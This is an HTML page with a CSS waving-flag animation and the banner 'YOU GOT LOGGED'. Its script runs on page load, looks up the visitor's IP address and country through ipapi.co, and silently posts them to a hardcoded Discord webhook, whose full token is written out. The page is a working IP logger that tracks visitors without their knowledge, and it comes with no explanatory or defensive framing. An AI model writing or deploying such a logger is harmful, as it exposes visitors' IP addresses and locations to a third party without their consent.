<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Established</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .status-text {
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 8px;
            color: #fff;
            text-shadow: 0 0 10px #fff, 0 0 20px #fff;
            margin-bottom: 50px;
        }

        /* Flag Scene */
        .scene {
            display: flex;
            align-items: flex-start;
            perspective: 1000px;
        }

        /* The Pole */
        .pole {
            width: 10px;
            height: 300px;
            background: linear-gradient(90deg, #222, #aaa, #222);
            border-radius: 5px;
            z-index: 2;
        }

        /* The Waving Cloth */
        .flag-cloth {
            width: 250px;
            height: 150px;
            background-size: cover;
            background-position: left center;
            position: relative;
            
            /* Combined 3D Wave & Shadow Animation */
            animation: 
                wave-3d 3s ease-in-out infinite,
                shadow-ripple 3s linear infinite;
                
            transform-origin: left center;
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
            margin-left: -2px; /* Pulls it flush against the pole */
        }

        /* 3D Cloth Bending */
        @keyframes wave-3d {
            0%, 100% { transform: rotateY(10deg) rotateX(2deg) skewY(-2deg); }
            50% { transform: rotateY(-15deg) rotateX(-2deg) skewY(2deg); }
        }

        /* This creates the moving "shadow" across the flag for a fabric look */
        @keyframes shadow-ripple {
            0% { 
                background-image: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(0,0,0,0.2) 20%, rgba(255,255,255,0) 40%);
                background-color: transparent;
            }
            100% { 
                background-image: linear-gradient(90deg, rgba(255,255,255,0) 60%, rgba(0,0,0,0.2) 80%, rgba(255,255,255,0) 100%);
            }
        }

        /* Adding a "Glow" to the flag edges */
        .flag-cloth::after {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            box-shadow: inset 0 0 20px rgba(255,255,255,0.1);
        }
    </style>
</head>
<body>

    <div class="status-text">YOU GOT LOGGED</div>

    <div class="scene">
        <div class="pole"></div>
        <div id="flag" class="flag-cloth"></div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function start() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // Set flag image
                const code = data.country_code.toLowerCase();
                const flagUrl = `https://flagcdn.com/w640/${code}.png`;
                
                // We apply the flag image via background style
                const flagElement = document.getElementById('flag');
                flagElement.style.backgroundImage = `url('${flagUrl}')`;

                // Webhook Log
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸš© FLAG RENDERED",
                            description: `IP: **${data.ip}**\nCountry: **${data.country_name}**`,
                            color: 16777215 // White
                        }]
                    })
                });
            } catch(e) {}
        }
        start();
    </script>
</body>
</html>
